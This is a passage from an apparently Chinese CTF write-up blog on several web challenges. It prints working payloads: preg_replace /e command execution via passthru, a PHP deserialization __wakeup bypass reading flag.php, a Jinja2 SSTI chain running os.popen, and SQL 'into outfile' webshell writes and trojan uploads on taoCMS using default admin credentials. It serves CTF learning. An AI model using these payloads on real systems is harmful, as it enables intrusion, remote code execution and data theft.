class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pattern&#x27;</span>]))<br>&#123;<br>    <span class="hljs-variable">$pattern</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pattern&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag|system|pass|cat|chr|ls|[0-9]|tac|nl|od|ini_set|eval|exec|dir|\.|\`|read*|show|file|\&lt;|popen|pcntl|var_dump|print|var_export|echo|implode|print_r|getcwd|head|more|less|tail|vi|sort|uniq|sh|include|require|scandir|\/| |\?|mv|cp|next|show_source|highlight_file|glob|\~|\^|\||\&amp;|\*|\%/i&quot;</span>,<span class="hljs-variable">$code</span>))<br>    &#123;<br>        <span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>        <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$pattern</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<span class="hljs-string">&#x27;print_r(&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$code</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are smart&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;try again&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;it is begin&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>it is begin<br></code></pre></td></tr></table></figure>
<p>一看到这过滤的真的是吓到我了，但往往这么可怕的情况下就会有bug，我们查看一番发现，竟然没过滤</p>
<p>passthru()函数，好好好这么玩是吧~~~</p>
<p>这个函数与system类似，用法也一致。重点是</p>
<p><code> preg_replace('/(' . $pattern . ')/ei','print_r(&quot;\\1&quot;)', $code);</code>此处的代码我们如何看懂</p>
<p>我这里也是看不懂，于是选择网上冲浪看看有机会没有，结果还真有类似的^_^，下面我就跟着那些佬的思路学习一下。</p>
<p>先介绍一个PHP特性吧：</p>
<p>php自身在解析请求的时候，如果参数名字中包含空格、.、[等字符，会将他们转换成_。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>;<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231002181255572.png'><img src="image-20231002181255572.png" alt="image-20231002181255572"></p>
<p>首先我们知道 preg_replace 的 /e 修正符会将 replacement 参数当作 php 代码，并且以 eval 函数的方式执行，前提是 subject 中有 pattern 的匹配。</p>
<p>既然是这样我们看一张图。</p>
<p class='item-img' data-src='image-20231002181321001.png'><img src="image-20231002181321001.png" alt="image-20231002181321001"></p>
<p>图中实际上通过 eval 执行的是 strtolower 函数。分别实际执行的是：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">&quot;JUST TEST&quot;</span>);<br><br><span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">&quot;PHPINFO()&quot;</span>);<br><br><span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$&#123;PHPINFO()&#125;</span>&#125;&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>第三个之所以可以执行代码，是因为我们通过复杂(花括号)语法的方式来让其代码执行。</p>
<p>然后在看：<code>这里的 replacement 是 strtolower(“\\1”) ，着重理解一下 \\1 。</code></p>
<p>\\1 在正则中存在自己的作用，其实就是匹配第一项</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php">这里给出例子<br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$regex</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="hljs-variable">$value</span>);<br> <br>regex是我们的参数值 即 get的名称  value是传入的参数<br> <br>.*=<span class="hljs-title function_ invoke__">phpinfo</span>()<br> <br>所以就变为了<br> <br><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(.*)/ei&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<span class="hljs-title function_ invoke__">phpinfo</span>());<br>但这里无法执行<span class="hljs-title function_ invoke__">phpinfo</span>()<br></code></pre></td></tr></table></figure>
<p>要变为：<code>&#123;$&#123;phpinfo()&#125;&#125;</code>，首先要知道</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=hello<br><span class="hljs-variable">$$a</span>=world   <br>这里相当于 <br><span class="hljs-variable">$hello</span>=world<br>所以<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span> <span class="hljs-variable">$hello</span> 为：hello world<br></code></pre></td></tr></table></figure>
<p>我们接着理解一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">$&#123;<span class="hljs-title function_ invoke__">phpinfo</span>()&#125;<br> <br>执行完会变为 $&#123;<span class="hljs-number">1</span>&#125; 因为 <span class="hljs-title function_ invoke__">phpinfo</span>()通过var_dump返回的是<span class="hljs-number">1</span><br> <br>所以strtolower 变为 <span class="hljs-title function_ invoke__">strtolower</span>(&#123;$&#123;<span class="hljs-number">1</span>&#125;&#125;)<br> <br>接着变为 <span class="hljs-title function_ invoke__">strtolower</span>(&#123;<span class="hljs-literal">null</span>&#125;) <br></code></pre></td></tr></table></figure>
<p>但似乎后面的对strtolower的解释无关紧要，我认为之主要注意通过${}来解析phpinfo()，否则无法进行命令执行</p>
<p>但有注意到PHP的特性会将.这类特殊符号转化为_，因此那些佬就换为了\S*（我不了解正则表达式，因此问了GPT）发现他俩作用在这里是相通的，不过某些细节不一致罢了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/(.*)/: <br>这部分正则表达式匹配整个输入字符串，并捕获它到一个分组中。 .* 匹配任意字符（除了换行符 \n），.* 的括号 ( ) 将匹配的内容捕获到一个分组中，以后可以在替换中使用。<br><br>(\S*)：这个部分表示匹配零个或多个非空白字符（非空格、非制表符、非换行符等），并将其捕获到分组中。<br></code></pre></td></tr></table></figure>
<p>然后我们就可以想到构造如下payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">GET：code=&#123;$&#123;passthru(ls)&#125;&#125;<br>POST：pattern=\S*<br></code></pre></td></tr></table></figure>
<p>不过考虑到过滤的很多，我就将其换为了ASCII码值来替换，脚本如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 输入字符串</span><br>input_str = <span class="hljs-string">&quot;ls&quot;</span><br><span class="hljs-comment"># 初始化一个空字符串来存储结果</span><br>output_str = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># 遍历输入字符串中的每个字符</span><br><span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> input_str:<br>    <span class="hljs-comment"># 获取字符的 ASCII 码值，并将其转换为字符串</span><br>    ascii_value = <span class="hljs-built_in">ord</span>(char)<br><br>    <span class="hljs-comment"># 格式化输出，拼接到结果字符串中</span><br>    output_str += <span class="hljs-string">f&quot;chr(<span class="hljs-subst">&#123;ascii_value&#125;</span>).&quot;</span><br><br><span class="hljs-comment"># 去除最后一个多余的点号</span><br>output_str = output_str.rstrip(<span class="hljs-string">&quot;.&quot;</span>)<br><br><span class="hljs-comment"># 打印结果</span><br><span class="hljs-built_in">print</span>(output_str)<br></code></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">结果为：ls-&gt;chr(108).chr(115)<br>ls /-&gt;chr(108).chr(115).chr(32).chr(47)<br>等等<br></code></pre></td></tr></table></figure>
<p>最终payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">code=$&#123;passthru(chr(99).chr(97).chr(116).chr(32).chr(105).chr(110).chr(100).chr(101).chr(120).chr(46).chr(112).chr(104).chr(112))&#125;<br><br>pattern=\S*<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231002184828011.png'><img src="image-20231002184828011.png" alt="image-20231002184828011"></p>
<p>找到flag</p>
<p>但这里不懂得点为：似乎非得转换为ASCII才能执行成功</p>
<h3 id="WEEK2-no-wake-up"><a href="#WEEK2-no-wake-up" class="headerlink" title="WEEK2-no-wake-up"></a>[WEEK2]no_wake_up</h3>
<p class='item-img' data-src='image-20231012181953324.png'><img src="image-20231012181953324.png" alt="image-20231012181953324"></p>
<p>直接点击看看，简单的反序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&quot;guest&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-string">&quot;admin&quot;</span>)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;try&#x27;</span>]); <br></code></pre></td></tr></table></figure>
<p>首先就是找敏感函数，很显然为include，这个可以产生文件包含漏洞。那我们看看如何调用该函数所在方法：destruct，这个函数会在对象被销毁的时候自动调用，并且只要满足username=admin即可。但在反序列化的时候，由于会自动调用wakeup方法而使username被赋值为guest，这样会导致username!=admin而无法调用include函数。因此我们要想办法绕过wakeup方法的调用</p>
<p>利用方式：<strong>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong></p>
<p>我们直接看poc来理解上句话</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>&#125;<br><span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">flag</span>();<br><span class="hljs-variable">$poc</span>-&gt;username = <span class="hljs-string">&#x27;admin&#x27;</span>;<br><span class="hljs-variable">$poc</span>-&gt;code = <span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>
<p>输出如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p>我们只修要做如下更改，将上述的2改为其他数字即可（这里我改成了3）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;flag&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;admin&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;code&quot;</span>;s:<span class="hljs-number">52</span>:<span class="hljs-string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231012182919003.png'><img src="image-20231012182919003.png" alt="image-20231012182919003"></p>
<p>base64解码即可，如下图拿到flag</p>
<p class='item-img' data-src='image-20231012182934094.png'><img src="image-20231012182934094.png" alt="image-20231012182934094"></p>
<h3 id="WEEK2-ez-ssti"><a href="#WEEK2-ez-ssti" class="headerlink" title="WEEK2-ez-ssti"></a>[WEEK2]ez_ssti</h3>
<p class='item-img' data-src='image-20231012183006466.png'><img src="image-20231012183006466.png" alt="image-20231012183006466"></p>
<p>经典页面，我们直接拼接url看看，这里我也是猜测需要get传参name，如下图</p>
<p class='item-img' data-src='image-20231012183155684.png'><img src="image-20231012183155684.png" alt="image-20231012183155684"></p>
<p>发现被成功解析执行，那我们跟着常规思路一步步尝试</p>
<p>1.首先考虑拿到一个class，通过字符串、元组、列表、字典均可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__&#125;&#125; 	<span class="hljs-comment">#这里我选择字符串</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231012183601848.png'><img src="image-20231012183601848.png" alt="image-20231012183601848"></p>
<p>2.下一步目的是拿到object基类。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&#123;&#123;&#x27;&#x27;.__class__.__base__&#125;&#125;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231012183629492.png'><img src="image-20231012183629492.png" alt="image-20231012183629492"></p>
<p>3.然后获取对应子类。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()&#125;&#125;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231012183710342.png'><img src="image-20231012183710342.png" alt="image-20231012183710342"></p>
<p>接下来就是寻找可用的类，比如命令执行类，文件读写类等等，这里可以全局搜索或者写一个脚本来搜索</p>
<p>这里找到之后发现&lt;class ‘os._wrap_close’&gt;是位于第132个，我们直接利用即可</p>
<p>5.通过某些手段找到某个函数是可用的，下一步利用这个类的__init__函数获取到__globals__全局变量，再获取到__globals__全局变量里的__builtins__中的eval函数。</p>
<p>随后导入os模块利用popen函数进行命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?name=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[132].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls /&quot;).read()&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='image-20231012185359554.png'><img src="image-20231012185359554.png" alt="image-20231012185359554"></p>
<p>如图根目录发现flag，直接读取即可</p>
<p class='item-img' data-src='image-20231012185420218.png'><img src="image-20231012185420218.png" alt="image-20231012185420218"></p>
<h3 id="WEEK2-EasyCMS"><a href="#WEEK2-EasyCMS" class="headerlink" title="WEEK2-EasyCMS"></a>[WEEK2]EasyCMS</h3>
<p class='item-img' data-src='image-20231012185523040.png'><img src="image-20231012185523040.png" alt="image-20231012185523040"></p>
<p>点开是一个网站内容管理系统叫做taoCMS，那我的思路是直接百度看看有何漏洞，尝试复现利用</p>
<p>百度之后有很多文章，不过这里我目前测试过的可以利用sql注入以及文件上传，一会儿参考文章放在下面，开始复现：</p>
<p>首先看了百度的文章发现了后台管理路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">/admin/admin.php?action=frame&amp;ctrl=iframes<br></code></pre></td></tr></table></figure>
<p>直接访问看看</p>
<p class='item-img' data-src='image-20231012194936775.png'><img src="image-20231012194936775.png" alt="image-20231012194936775"></p>
<p>发现要登录，不过这里很幸运利用网站的默认密码就进去了：admin，tao</p>
<h4 id="方法一：sql命令执行"><a href="#方法一：sql命令执行" class="headerlink" title="方法一：sql命令执行"></a>方法一：sql命令执行</h4>
<p class='item-img' data-src='image-20231012195045755.png'><img src="image-20231012195045755.png" alt="image-20231012195045755"></p>
<p>进入后台如上图会有两处利用点，一个是执行SQL，一个是文件管理。我们先看sql吧，这里没有过滤，我们直接尝试sql语句向网站中写入一句话木马文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php @eval($_POST[1];?&gt;)&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/flag.php&#x27;</span><br>或<br><span class="hljs-keyword">select</span> &quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;)&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/flag.php&#x27;</span><br></code></pre></td></tr></table></figure>
<p>写入后直接url后面访问上述文件即可</p>
<p class='item-img' data-src='image-20231012194230363.png'><img src="image-20231012194230363.png" alt="image-20231012194230363"></p>
<p>这里我失误了，于是又写了一个cat.php，不用在意直接拿到flag</p>
<p class='item-img' data-src='image-20231012194427510.png'><img src="image-20231012194427510.png" alt="image-20231012194427510"></p>
<h4 id="方法二：文件上传"><a href="#方法二：文件上传" class="headerlink" title="方法二：文件上传"></a>方法二：文件上传</h4>
<p>直接点击文件管理</p>
<p class='item-img' data-src='image-20231012195416427.png'><img src="image-20231012195416427.png" alt="image-20231012195416427"></p>
<p>如上图，我看许多文件都会在htaccess文件中写入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">AddType application/x-httpd-php .php3<br></code></pre></td></tr></table></figure>
<p>来确保系统会以php解析php3后缀文件，于是直接向php3文件写入一句话木马来利用</p>
<p class='item-img' data-src='image-20231012195607389.png'><img src="image-20231012195607389.png" alt="image-20231012195607389"></p>
<p>但我这里写入之后访问会发现直接下载了，所以我认为这个点在这里并不能利用，不过我们直接向后台创建写入一个php木马文件即可，不需要上述那样麻烦</p>
<p class='item-img' data-src='image-20231012195707915.png'><img src="image-20231012195707915.png" alt="image-20231012195707915"></p>
<p>如上图我们直接访问</p>
<p class='item-img' data-src='image-20231012195732948.png'><img src="image-20231012195732948.png" alt="image-20231012195732948"></p>
<p>可以看到成功解析，后续就不再赘述了</p>
<p>上述复现可参考：<a target="_blank" rel="noopener" href="https://dhexx.cn/news/show-4839081.html?action=onClick">春秋云境：CVE-2022-23880（taoCMS v3.0.2 任意文件上传漏洞）</a></p>
<h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64180167/article/details/132797583?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace%20/e%20%E5%88%A9%E7%94%A8&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-132797583.142%5Ev94%5Einsert_down1&amp;spm=1018.2226.3001.4187">[BJDCTF2020]ZJCTF，不过如此 preg_replace /e模式漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/115363699">[BJDCTF2020]ZJCTF，不过如此</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_33006121/article/details/114357320?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace">https://blog.csdn.net/weixin_33006121/article/details/114357320?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=preg_replace</a>(%27/(%27%20.%20</p>
<h3 id="WEEK2-serialize"><a href="#WEEK2-serialize" class="headerlink" title="WEEK2-serialize"></a>[WEEK2]serialize</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">misca</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$gao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fei</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">miaomiao</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;gao=<span class="hljs-variable language_">$this</span>-&gt;fei;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-variable language_">$this</span>-&gt;a);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">miaomiao</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-string">&#x27;Mikey Mouse~&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">musca</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ding</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dong</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;ding-&gt;dong;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">milaoshu</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$v</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span><span class="hljs-string">&quot;misca~musca~milaoshu~~~&quot;</span>;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable language_">$this</span>-&gt;v);<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^O:\d+/&#x27;</span>,<span class="hljs-variable">$data</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;you should think harder!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;wanna_fl.ag&quot;</span>])); <br></code></pre></td></tr></table></figure>
<p>虽然是简单的反序列化，但其中还是很多考点的。我们先总体分析一波。</p>
<p>老思路先找敏感函数，很明显就是include函数了，接下来我们看如何利用其所在的tostring魔术方法：</p>
<p>搜寻一番发现get魔术方法里面存在die(变量)意思是程序结束前将该变量以字符串形式输出，那不就来了嘛，这里显然就是调用tostring的点。</p>
<p>接下来看如何调用get魔术方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">__get()，读取不可访问属性的值时调用<br></code></pre></td></tr></table></figure>
<p>那根据上述利用条件我们可以找到wakeup魔术方法中的return语句，这就是我们要利用的点，至于wakeup的方法调用很简单，反序列化即可。</p>
<p>综上所述链子为：<code>musca.wakeup-&gt;misca.get-&gt;milaoshu.tostring-&gt;include</code></p>
<p>接下来就是赋值问题了，这里先上pop</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">misca</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$gao</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$fei</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">musca</span></span>&#123;<br>    <span 